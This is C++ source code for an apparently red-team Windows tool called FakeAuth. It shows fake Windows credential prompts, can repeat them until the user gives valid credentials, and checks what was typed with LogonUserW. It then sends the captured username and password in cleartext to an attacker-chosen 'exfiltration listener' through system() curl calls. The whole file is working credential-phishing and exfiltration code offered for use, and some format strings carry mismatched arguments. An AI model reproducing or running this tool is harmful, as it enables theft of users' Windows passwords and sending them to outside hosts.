#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif


#include <iostream>
#include <Windows.h>
#include <wincred.h>

#pragma comment(lib, "Credui.lib")

VOID PrintLogo() {
	wprintf(L"\n< FakeAuth v1.00 | atn1ght/Github | @atn1ght1/Twitter >\n");
	wprintf(L"   \\\n");
	wprintf(L"    \\\n");
	wprintf(L"        .--.\n");
	wprintf(L"       |o_o |\n");
	wprintf(L"       |:_/ |\n");
	wprintf(L"      //   \\ \\\n");
	wprintf(L"     (|     | )\n");
	wprintf(L"    /'\\_   _/`\\\n");
	wprintf(L"    \\___)=(___/\n");
	wprintf(L"\n");
	wprintf(L"Usage: FakeAuth.exe <type> <count> <title> <message> <listener>\n");
	wprintf(L"type     (integer) -> Prompt Style (1,2)\n");
	wprintf(L"count    (long)    -> How many prompts after invalid Credentials (0,1,2,..,n 0=unlimited)\n");
	wprintf(L"title    (string)  -> Prompt title (type=1 only)\n");
	wprintf(L"message  (string)  -> Window message\n");
	wprintf(L"listener (string)  -> HTTP exfiltration listener (10.0.0.0:80), if not specified print stdout\n\n");
	return;
}

void type1(int n, char* title, char* msg, char* url = NULL) {

	wchar_t promptCaption[20];
	mbstowcs(promptCaption, title, strlen(title) + 1);
	LPWSTR ptr = promptCaption;

	wchar_t promptMessage[20];
	mbstowcs(promptMessage, msg, strlen(msg) + 1);
	LPWSTR ptrx = promptMessage;

	CREDUI_INFO ci = { sizeof(ci) };
	ci.pszCaptionText = promptCaption;
	ci.pszMessageText = promptMessage;

	WCHAR username[255] = {};
	WCHAR password[255] = {};
	WCHAR res[1024] = {};
	DWORD result = 0;
	char x[255];

	int i = 0;
	do {
		if (url != NULL) {
			sprintf(x, "curl http://%s/?res=%i_prompt", i + 1);
			system(x);
		} else {
			printf("[.] Prompt created! (%i/%i)\n", i + 1, n);
		}
		result = CredUIPromptForCredentialsW(&ci, L".", NULL, 5, username, 255, password, 255, FALSE, CREDUI_FLAGS_GENERIC_CREDENTIALS);
		if (result == ERROR_SUCCESS)
		{
			HANDLE newToken = NULL;
			BOOL credentialsValid = FALSE;

			credentialsValid = LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);
			if (credentialsValid)
			{
				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_valid_%S:%S", i + 1, url, username, password);
					system(x);
				} else {
					printf("[+] Valid credentials entered!  %S:%S (%i/%i)\n", username, password, i + 1, n);
				}
				i = n;
			} else {
				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_invalid_%S:%S", i + 1, url, username, password);
					system(x);
				}
				else {
					printf("[-] Invalid credentials entered!  %S:%S (%i/%i)\n", username, password, i + 1, n);
				}

				if (n == 0)
					i = -1;
				else
					i++;
			}
		}
		else if (result == ERROR_CANCELLED)
		{
			if (url != NULL) {
				sprintf(x, "curl http://%s/?res=%i_canceled", i + 1);
				system(x);
			} else {
				printf("[-] Prompt canceled! (%i/%i)\n", i + 1, n);
			}
			if (n == 0)
				i = -1;
			else
				i++;
		}
	} while (i < n);
}

void type2(long n, char* msg, char* url = NULL) {
	int i = 0;

	wchar_t promptMessage[20];
	mbstowcs(promptMessage, msg, strlen(msg) + 1);
	LPWSTR ptrx = promptMessage;


	BOOL loginStatus = FALSE;
	do {
		CREDUI_INFOW credui = {};
		credui.cbSize = sizeof(credui);
		credui.hwndParent = nullptr;
		credui.pszCaptionText = promptMessage;
		credui.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID outCredBuffer = nullptr;
		ULONG outCredSize = 0;
		BOOL save = false;
		DWORD err = 0;
		char x[255];

		if (url != NULL) {
			sprintf(x, "curl http://%s/?res=%i_prompt", i + 1);
			system(x);
		} else {
			std::wcout << "\n[.] Prompt created!" << " (" << i + 1 << "/" << n << ")";
		}

		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_CURRENT_USER);
		if (err == ERROR_SUCCESS) {
			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD maxLenName = CREDUI_MAX_USERNAME_LENGTH + 1;
			DWORD maxLenPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outCredBuffer, outCredSize, pszUName, &maxLenName, domain, &maxLenDomain, pszPwd, &maxLenPassword);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(pszUName, parsedUserName, CREDUI_MAX_USERNAME_LENGTH + 1, parsedDomain, CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);

			if (loginStatus == TRUE) {
				CloseHandle(handle);

				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_valid_%S:%S", i + 1, url, pszUName, pszPwd);
					printf("%s", x);
					system(x);
				} else {
					std::wcout << "\n[+] Valid credentials entered!" << pszUName << ":" << pszPwd << " (" << i + 1 << "/" << n << ")";
				}
				i++;
				break;
			}
			else {

				if (url != NULL) {
					sprintf(x, "curl http://%s/?res=%i_invalid_%S:%S", i + 1, url, pszUName, pszPwd);
					system(x);
				} else {
					std::wcout << "\n[-] Invalid credentials entered! " << pszUName << ":" << pszPwd << " (" << i + 1 << "/" << n << ")";
				}
				loginStatus = FALSE;
				i++;
				if (n == 0)
					i = -1;
			}
		} else {
			if (url != NULL) {
				sprintf(x, "curl http://%s/?res=%i_canceled", i + 1);
				system(x);
			} else {
				std::wcout << "\n[.] Prompt canceled!" << " (" << i + 1 << "/" << n << ")";
			}
			if (n == 0)
				i = -1;
			else
				i++;
		}
	} while (i < n);
}

void main(int argc, char* argv[])
{
	long l = 23975297960935;

	if (argc < 4) {
		PrintLogo();
		return;
	}

	long n = strtol(argv[2], NULL, 10);
	long type = strtol(argv[1], NULL, 10);

	if (type == 1) {
		if (argc > 5) {
			type1(n, argv[3], argv[4], argv[5]);
		} else {
			type1(n, argv[3], argv[4], NULL);
		}
	}
	else if (type == 2) {
		if (argc > 5) {
			type2(n, argv[4], argv[5]);
		} else {
			type2(n, argv[4], NULL);
		}
	}
	return;
}